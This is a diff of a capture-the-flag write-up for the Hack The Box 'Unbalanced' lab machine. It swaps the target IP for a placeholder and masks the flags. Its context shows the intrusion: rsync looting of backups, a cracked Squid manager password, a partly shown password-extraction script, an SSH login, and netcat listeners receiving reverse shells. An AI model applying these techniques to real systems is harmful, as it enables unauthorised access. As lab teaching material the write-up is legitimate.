@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Unbalanced
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-unballanced-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 TODO: finish writing and do cleanup
@@ -31,11 +29,11 @@ TODO: finish writing and do cleanup
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.200`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ nmap -p- -sCV -n -v -oA unbalanced 10.10.10.200
+└─$ nmap -p- -sCV -n -v -oA unbalanced <YOUR_IP>
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-13 20:15 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -46,25 +44,25 @@ Completed NSE at 20:15, 0.00s elapsed
 Initiating NSE at 20:15
 Completed NSE at 20:15, 0.00s elapsed
 Initiating Ping Scan at 20:15
-Scanning 10.10.10.200 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 20:15, 0.04s elapsed (1 total hosts)
 Initiating Connect Scan at 20:15
-Scanning 10.10.10.200 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.200
-Discovered open port 873/tcp on 10.10.10.200
-Discovered open port 3128/tcp on 10.10.10.200
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 873/tcp on <YOUR_IP>
+Discovered open port 3128/tcp on <YOUR_IP>
 Completed Connect Scan at 20:15, 41.82s elapsed (65535 total ports)
 Initiating Service scan at 20:15
-Scanning 3 services on 10.10.10.200
+Scanning 3 services on <YOUR_IP>
 Completed Service scan at 20:16, 11.18s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.10.200.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 20:16
 Completed NSE at 20:16, 1.70s elapsed
 Initiating NSE at 20:16
 Completed NSE at 20:16, 0.19s elapsed
 Initiating NSE at 20:16
 Completed NSE at 20:16, 0.00s elapsed
-Nmap scan report for 10.10.10.200
+Nmap scan report for <YOUR_IP>
 Host is up (0.052s latency).
 Not shown: 65532 closed ports
 PORT     STATE SERVICE    VERSION
@@ -107,8 +105,8 @@ found an article on pentesting port 873 - rsync - [https://book.hacktricks.xyz/p
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ nc -vn 10.10.10.200 873
-(UNKNOWN) [10.10.10.200] 873 (rsync) open
+└─$ nc -vn <YOUR_IP> 873
+(UNKNOWN) [<YOUR_IP>] 873 (rsync) open
 @RSYNCD: 31.0
 @RSYNCD: 31.0
 #list 
@@ -120,7 +118,7 @@ apparently this machine had some EncFS-encrypted configuration backups enabled
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
-└─$ rsync -av rsync://10.10.10.200:873/conf_backups ./conf_backups                                 1 ⨯
+└─$ rsync -av rsync://<YOUR_IP>:873/conf_backups ./conf_backups                                 1 ⨯
 receiving incremental file list
 created directory ./conf_backups
 ./
@@ -510,13 +508,13 @@ there was a password of `Thah$Sh1` which enabled a lot of the actions
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
-└─$ nikto -host 127.0.0.1 -useproxy http://10.10.10.200:3128                                     130 ⨯
+└─$ nikto -host 127.0.0.1 -useproxy http://<YOUR_IP>:3128                                     130 ⨯
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          127.0.0.1
 + Target Hostname:    127.0.0.1
 + Target Port:        80
-+ Proxy:              10.10.10.200:3128
++ Proxy:              <YOUR_IP>:3128
 + Start Time:         2020-11-14 15:23:10 (GMT-5)
 ---------------------------------------------------------------------------
 + Server: squid/4.6
@@ -548,9 +546,9 @@ I ran nikto to see if there were any vulnerabilities, it reported a few differen
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
-└─$ curl -v -x http://10.10.10.200:3128 http://intranet.unbalanced.htb
-*   Trying 10.10.10.200:3128...
-* Connected to 10.10.10.200 (10.10.10.200) port 3128 (#0)
+└─$ curl -v -x http://<YOUR_IP>:3128 http://intranet.unbalanced.htb
+*   Trying <YOUR_IP>:3128...
+* Connected to <YOUR_IP> (<YOUR_IP>) port 3128 (#0)
 > GET http://intranet.unbalanced.htb/ HTTP/1.1
 > Host: intranet.unbalanced.htb
 > User-Agent: curl/7.72.0
@@ -570,7 +568,7 @@ I ran nikto to see if there were any vulnerabilities, it reported a few differen
 < Via: 1.1 unbalanced (squid/4.6)
 < Connection: keep-alive
 < 
-* Connection #0 to host 10.10.10.200 left intact
+* Connection #0 to host <YOUR_IP> left intact
 ```
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-unbalanced-intranet%2520%25281%2529%2520%25281%2529.png)
@@ -579,9 +577,9 @@ while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-h
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
-└─$ curl -v -x http://10.10.10.200:3128 http://intranet.unbalanced.htb/                       
-*   Trying 10.10.10.200:3128...
-* Connected to 10.10.10.200 (10.10.10.200) port 3128 (#0)
+└─$ curl -v -x http://<YOUR_IP>:3128 http://intranet.unbalanced.htb/                       
+*   Trying <YOUR_IP>:3128...
+* Connected to <YOUR_IP> (<YOUR_IP>) port 3128 (#0)
 > GET http://intranet.unbalanced.htb/ HTTP/1.1
 > Host: intranet.unbalanced.htb
 > User-Agent: curl/7.72.0
@@ -601,14 +599,14 @@ while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-h
 < Via: 1.1 unbalanced (squid/4.6)
 < Connection: keep-alive
 < 
-* Connection #0 to host 10.10.10.200 left intact
+* Connection #0 to host <YOUR_IP> left intact
 ```
 
 noticed that this time the intranet host was was different: this time was `host2`. After testing a few times I only got host 2 and 3.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
-└─$ dirb http://intranet.unbalanced.htb /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -p 10.10.10.200:3128 -w
+└─$ dirb http://intranet.unbalanced.htb /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -p <YOUR_IP>:3128 -w
 
 -----------------
 DIRB v2.22    
@@ -617,7 +615,7 @@ By The Dark Raver
 START_TIME: Sat Nov 14 16:43:58 2020
 URL_BASE: http://intranet.unbalanced.htb/
 WORDLIST_FILES: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
-PROXY: 10.10.10.200:3128
+PROXY: <YOUR_IP>:3128
 OPTION: Not Stopping on warning messages
 -----------------
 GENERATED WORDS: 62239                                                         
@@ -658,7 +656,7 @@ cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ squidclient -h 10.10.10.200 -p 3128 http://intranet-host2.unbalanced.htb mgr:menu
+└─$ squidclient -h <YOUR_IP> -p 3128 http://intranet-host2.unbalanced.htb mgr:menu
 HTTP/1.1 401 Unauthorized
 Server: squid/4.6
 Mime-Version: 1.0
@@ -683,13 +681,13 @@ Connection: close
 <hr>
 
 <div id="content">
-<p>The following error was encountered while trying to retrieve the URL: <a href="cache_object://10.10.10.200/menu">cache_object://10.10.10.200/menu</a></p>
+<p>The following error was encountered while trying to retrieve the URL: <a href="cache_object://<YOUR_IP>/menu">cache_object://<YOUR_IP>/menu</a></p>
 
 <blockquote id="error">
 <p><b>Cache Manager Access Denied.</b></p>
 </blockquote>
 
-<p>Sorry, you are not currently allowed to request cache_object://10.10.10.200/menu from this cache manager until you have authenticated yourself.</p>
+<p>Sorry, you are not currently allowed to request cache_object://<YOUR_IP>/menu from this cache manager until you have authenticated yourself.</p>
 ...snipped...
 ```
 
@@ -697,7 +695,7 @@ I was on the right track, now I just needed to figure out how to authenticate wi
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:menu
+└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:menu
 HTTP/1.1 200 OK
 Server: squid/4.6
 Mime-Version: 1.0
@@ -769,7 +767,7 @@ Connection: close
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:pconn
+└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:pconn
 HTTP/1.1 200 OK
 Server: squid/4.6
 Mime-Version: 1.0
@@ -781,7 +779,6 @@ X-Cache: MISS from unbalanced
 X-Cache-Lookup: MISS from unbalanced:3128
 Via: 1.1 unbalanced (squid/4.6)
 Connection: close
-
 
  Pool 0 Stats
 server-peers persistent connection counts:
@@ -805,7 +802,7 @@ I put this address in my \(proxied\) browser, and it navigated to the same page!
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:fqdncache
+└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:fqdncache
 HTTP/1.1 200 OK
 Server: squid/4.6
 Mime-Version: 1.0
@@ -851,7 +848,7 @@ Taken out of load balancing, but not down? I wondered if there was a way to load
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:filedescriptors
+└─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:filedescriptors
 HTTP/1.1 200 OK
 Server: squid/4.6
 Mime-Version: 1.0
@@ -896,7 +893,7 @@ import string
 #URL to connect to
 url = 'http://172.31.179.1/intranet.php'
 #URL of connection proxy
-proxy_url = 'http://10.10.10.200:3128'
+proxy_url = 'http://<YOUR_IP>:3128'
 #list of users to get passwords for
 userlist = ['rita','jim','bryan','sarah']
 
@@ -974,12 +971,12 @@ For some reason I had to strip off extra `'` characters from the passwords. I su
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
-└─$ ssh bryan@10.10.10.200                                                                         2 ⨯
-The authenticity of host '10.10.10.200 (10.10.10.200)' can't be established.
+└─$ ssh bryan@<YOUR_IP>                                                                         2 ⨯
+The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.200' (ECDSA) to the list of known hosts.
-bryan@10.10.10.200's password: 
+Warning: Permanently added '<YOUR_IP>' (ECDSA) to the list of known hosts.
+bryan@<YOUR_IP>'s password: 
 Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -988,7 +985,7 @@ individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4
+Last login: Wed Jun 17 14:16:06 2020 from <YOUR_IP>
 bryan@unbalanced:~$ id && hostname
 uid=1000(bryan) gid=1000(bryan) groups=1000(bryan)
 unbalanced
@@ -1011,7 +1008,7 @@ drwx------ 3 bryan bryan 4096 Apr  2  2020 .gnupg
 -rw-r--r-- 1 bryan bryan  798 Jun 17 11:35 TODO
 -rw-r--r-- 1 root  root    33 Nov 13 09:52 user.txt
 bryan@unbalanced:~$ cat user.txt 
-3634eb990b28b6a80e75e5d79574bc51
+****
 ```
 
 Luckily, this was also the user with the flag!
@@ -1112,7 +1109,7 @@ bryan@unbalanced:~$ ip a
        valid_lft forever preferred_lft forever
 2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:50:56:b9:3f:b6 brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.200/24 brd 10.10.10.255 scope global ens160
+    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
        valid_lft forever preferred_lft forever
     inet6 dead:beef::250:56ff:feb9:3fb6/64 scope global dynamic mngtmpaddr 
        valid_lft 86248sec preferred_lft 14248sec
@@ -1209,8 +1206,8 @@ inside `dnsmasq.conf` there was a listen address of 172.31.0.1 - this was the sa
 
 ```text
 bryan@unbalanced:/etc$ ip route
-default via 10.10.10.2 dev ens160 onlink 
-10.10.10.0/24 dev ens160 proto kernel scope link src 10.10.10.200 
+default via <YOUR_IP> dev ens160 onlink 
+<YOUR_IP>/24 dev ens160 proto kernel scope link src <YOUR_IP> 
 169.254.0.0/16 dev ens160 scope link metric 1000 
 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
 172.31.0.0/16 dev br-742fc4eb92b1 proto kernel scope link src 172.31.0.1 
@@ -1221,7 +1218,7 @@ bryan@unbalanced:/etc$ ip neighbor
 172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE
 172.17.179.1 dev docker0  FAILED
 172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
-10.10.10.2 dev ens160 lladdr 00:50:56:b9:f3:4f REACHABLE
+<YOUR_IP> dev ens160 lladdr 00:50:56:b9:f3:4f REACHABLE
 fe80::250:56ff:feb9:f34f dev ens160 lladdr 00:50:56:b9:f3:4f router STALE
 ```
 
@@ -1287,7 +1284,7 @@ blocklist update
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ nc -lvnp 8099                                                                                   1 ⨯
 listening on [any] 8099 ...
-connect to [10.10.15.88] from (UNKNOWN) [10.10.10.200] 55154
+connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 55154
 GET / HTTP/1.1
 Host: 10.10.15.88:8099
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
@@ -1340,7 +1337,7 @@ the payload was away...
 └─$ nc -lvnp 12345       
 listening on [any] 12345 ...
 id  
-connect to [10.10.15.88] from (UNKNOWN) [10.10.10.200] 40152
+connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 40152
 /bin/sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1354,7 +1351,7 @@ and I got a shell...as `www-data`!?
 └─$ nc -lvnp 12345       
 listening on [any] 12345 ...
 id  
-connect to [10.10.15.88] from (UNKNOWN) [10.10.10.200] 40152
+connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 40152
 /bin/sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1472,13 +1469,9 @@ root@unbalanced:/home/bryan# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 unbalanced
 root@unbalanced:/home/bryan# cat /root/root.txt 
-1f44f63ea2091658343825cc25a682d7
+****
 ```
 
 Finally!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-pwned.png)
-
-Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for... \[something interesting or useful about this machine.\]
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
